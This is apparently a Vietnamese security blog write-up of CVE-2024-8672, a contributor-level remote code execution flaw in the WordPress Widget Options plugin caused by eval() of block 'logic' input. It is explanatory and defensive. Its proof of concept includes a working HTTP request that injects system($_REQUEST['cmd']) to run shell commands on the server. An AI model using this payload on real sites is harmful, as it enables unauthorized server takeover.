# CVE-2024-8672 Analysis & POC


<!--more-->

## CVE & Basic Info
**The Widget Options – The #1 WordPress Widget & Block Control Plugin** cho WordPress tồn tại lỗ hổng **Remote Code Execution** trong tất cả các phiên bản cho đến, và bao gồm, **4.0.7** thông qua chức năng **display logic** mở rộng cho nhiều **page builders**, do plugin cho phép input đi qua **eval()** mà không có lọc hay kiểm tra capability, khiến kẻ tấn công đã xác thực với quyền **contributor-level access** trở lên có thể thực thi code trên server; mặc dù đã được **patched**, vấn đề vẫn tiềm ẩn rủi ro dư thừa vì chưa được gia cố đầy đủ.

* **CVE ID**: [CVE-2024-8672](https://www.cve.org/CVERecord?id=CVE-2024-8672)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 4.0.7
* **Patched Versions**: 4.0.8
* **CVSS severity**: High (9.9)
* **Required Privilege**: Contributor
* **Product**: [WordPress Widget Options Plugin](https://wordpress.org/plugins/widget-options/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Widget Options**:  
    * `4.0.7` – **vulnerable**  
    * `4.1.3` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause 

**Trong phiên bản lỗi (v4.0.7):**

```php {title="extras.php v4.0.7" data-open=true hl_lines=[5]}
function widgetopts_safe_eval($expression)
{
    ob_start();
    try {
        $result = (bool) eval("return $expression;");
    } catch (Throwable $e) {
        return false;
    }
    ob_end_clean();

    return $result;
}
```

Lỗ hổng xuất phát từ hàm `widgetopts_safe_eval` cho phép thực thi lệnh bất kỳ thông qua `eval`

**Bản vá (v4.1.3):**

```php {title="extras.php v4.1.3" data-open=true hl_lines=[10,22]}
function widgetopts_safe_eval($expression)
{
    if (widgetopts_is_widget_or_post_preview()) {
        // Always return true for previews unless the user is an administrator
        if (!current_user_can('administrator')) {
            return true;
        }
    }

    $validation_result = widgetopts_validate_expression($expression);

    if ($validation_result['valid'] === false) {
        return false;
    }

    if (stristr($expression, "return") === false) {
        $expression = "return (" . $expression . ");";
    }

    ob_start();
    try {
        $result = (bool) (@eval($expression));
    } catch (\Exception $e) {
        $result = false;
    } catch (\Error $e) {
        $result = false;
    } catch (\ParseError $e) {
        $result = false;
    } catch (\Throwable $e) {
        $result = false;
    }
    ob_end_clean();

    return $result;
}
```

Bản vá đã validate `$expression` bằng cách gọi hàm `widgetopts_validate_expression`([https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534](https://plugins.trac.wordpress.org/browser/widget-options/trunk/includes/extras.php#L534))

## Analysis
Plugin này đăng ký một **filter hook** vào `render_block`:

```php
add_filter('render_block', function ($block_content, $parsed_block, $obj) {
    if (!is_admin()) {
        add_filter("render_block_{$obj->name}", "blockopts_filter_before_display", 100, 3);
    }
    return $block_content;
}, 100, 3);
```

- Hook `render_block` được kích hoạt mỗi khi một block được render trong **trình chỉnh sửa mặc định của WordPress (Gutenberg)**.  
- Nếu không ở môi trường quản trị (`!is_admin()`), plugin sẽ gắn thêm filter riêng cho block hiện tại (`render_block_{block_name}`) để xử lý nội dung trước khi hiển thị bằng hàm `blockopts_filter_before_display`.  

```php {title="gutenberg-toolbar.php v4.0.7" data-open=true hl_lines=[4,6,8,22]}
function blockopts_filter_before_display($block_content, $parsed_block, $obj)
{
    ...
    if (isset($parsed_block) && isset($parsed_block['attrs']) && (isset($parsed_block['attrs']['extended_widget_opts']) || isset($parsed_block['attrs']['extended_widget_opts_block']))) {
        ...
        if ('activate' == $widget_options['logic']) {
			// display widget logic
			if (isset($opts['class']) && isset($opts['class']['logic']) && !empty($opts['class']['logic'])) {
				$display_logic = stripslashes(trim($opts['class']['logic']));
				$display_logic = apply_filters('widget_options_logic_override_block', $display_logic);
				$display_logic = apply_filters('extended_widget_options_logic_override_block', $display_logic);
				if ($display_logic === false) {
					return false;
				}
				if ($display_logic === true) {
					return true;
				}
				// if (stristr($display_logic, "return") === false) {
				// 	$display_logic = "return (" . $display_logic . ");";
				// }
				$display_logic = htmlspecialchars_decode($display_logic, ENT_QUOTES);
				if (!widgetopts_safe_eval($display_logic)) {
					return false;
				}
			}
		}
        ...
    }
}
```

Dòng 4 kiểm tra điều kiện `Gutenberg Page & Post Block Options` có được bật hay chưa, ta bật nó trong Admin Dashboard

![enable](enable.png "Bật Gutenberg Page & Post Block Options")

Ở dòng 6 và dòng 8, đoạn mã kiểm tra xem trường **logic** có tồn tại và không rỗng. Nếu điều kiện này đúng, hàm `widgetopts_safe_eval($display_logic)` sẽ được gọi, dẫn đến việc thực thi bất kỳ lệnh nào được truyền vào.  

![Logic](logic.png "Trường logic khi submit post")

Ở đây, khi sử dụng **Contributor** account để tạo post, trường logic đã xuất hiện trong request với giá trị là `payload`. Ta hoàn toàn có thể kiểm soát trường này.

## Flow
{{< mermaid >}}
graph TD
A["Attacker has a Contributor (or higher) account"]
--> B["Creates or edits a post using Gutenberg"]

B --> C["Inserts malicious PHP into the 'Logic' field (extended_widget_opts)"]
C --> D["Payload is saved in block attributes"]

D --> E["render_block hook is triggered"]
E --> F["blockopts_filter_before_display() is executed"]

F --> G["widgetopts_safe_eval() is called"]
G --> H["eval() executes the attacker’s payload"]

H --> I["Remote Code Execution on the server"]
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Sử dụng Administrator account bật option **Gutenberg Page & Post Block Options**
2. Tạo post với Contributor account:

```http
POST /index.php/wp-json/wp/v2/posts/170?_locale=user&cmd=ls+/ HTTP/1.1
Host: localhost
...
{"id":170,"title":"testing","content":"<!-- wp:paragraph {\"atts\":{\"id_base\":-1,\"column\":{\"desktop\":\"12\",\"tablet\":\"12\",\"mobile\":\"12\"},\"alignment\":{\"desktop\":\"default\",\"tablet\":\"default\",\"mobile\":\"default\"},\"roles\":{\"state\":\"\",\"options\":\"hide\"},\"visibility\":{\"selected\":\"0\",\"options\":\"hide\",\"acf\":{\"visibility\":\"hide\",\"field\":\"\",\"condition\":\"\",\"value\":\"\"}},\"author_page\":{\"author_pages\":{\"selections\":\"1\"}},\"devices\":{\"options\":\"hide\"},\"days\":{\"options\":\"hide\"},\"dates\":{\"options\":\"hide\",\"from\":\"\",\"to\":\"\"},\"styling\":{\"selected\":\"0\",\"bg_image\":\"\",\"background\":\"\",\"background_hover\":\"\",\"heading\":\"\",\"text\":\"\",\"links\":\"\",\"links_hover\":\"\",\"border_color\":\"\",\"border_type\":\"\",\"border_width\":\"\",\"background_input\":\"\",\"text_input\":\"\",\"border_color_input\":\"\",\"border_type_input\":\"\",\"border_width_input\":\"\",\"background_submit\":\"\",\"background_submit_hover\":\"\",\"text_submit\":\"\",\"border_color_submit\":\"\",\"border_type_submit\":\"\",\"border_width_submit\":\"\",\"list_border_color\":\"\",\"table_border_color\":\"\"},\"class\":{\"selected\":\"0\",\"link\":\"\",\"id\":\"a\",\"classes\":\"\",\"animation\":\"\",\"event\":\"enters\",\"speed\":\"\",\"offset\":\"\",\"delay\":\"\",\"logic\":\"system($_REQUEST[\"cmd\"])\"},\"tabselect\":\"0\"},\"dateUpdated\":123} -->\n<p>Payload</p>\n<!-- /wp:paragraph -->","status":"pending"}
```
![Result](result.png "Kết quả")

## Conclusion
Lỗ hổng trong **Widget Options <= 4.0.7** xuất phát từ việc sử dụng **`eval()` không an toàn** trong tính năng **display logic**. Dữ liệu do người dùng kiểm soát từ thuộc tính block `extended_widget_opts` được truyền trực tiếp vào hàm `widgetopts_safe_eval()` mà **không được kiểm tra, lọc hoặc xác thực đầy đủ**. Điều này cho phép kẻ tấn công đã **xác thực** với quyền **Contributor (hoặc cao hơn)** chèn và thực thi mã PHP tùy ý trong quá trình render block, dẫn đến **Remote Code Execution (RCE)** trên server.

Mặc dù các phiên bản sau đã bổ sung cơ chế kiểm tra biểu thức (expression validation), nhưng nguyên nhân gốc vẫn nằm ở việc **tin tưởng dữ liệu logic chưa được lọc** và cho phép thực thi động bằng `eval()`.

## Key Takeaways
* Tuyệt đối **không truyền dữ liệu do người dùng kiểm soát vào `eval()`**, kể cả trong các tính năng “logic” hay “điều kiện”.
* Tất cả thuộc tính của block / widget phải được **xác thực (validate) và làm sạch (sanitize)** nghiêm ngặt trước khi sử dụng.
* **Quyền Contributor vẫn có thể rất nguy hiểm** nếu kết hợp với các cơ chế thực thi mã không an toàn ở phía server.
* Tránh thực thi mã động; thay vào đó hãy sử dụng **parser an toàn** hoặc **danh sách trắng (whitelist) các biểu thức hợp lệ**.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress Widget Options Plugin <= 4.0.7 is vulnerable to Remote Code Execution (RCE)](https://patchstack.com/database/wordpress/plugin/widget-options/vulnerability/wordpress-widget-options-plugin-4-0-7-authenticated-contributor-remote-code-execution-vulnerability)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-12-04-cve-2024-8672/  

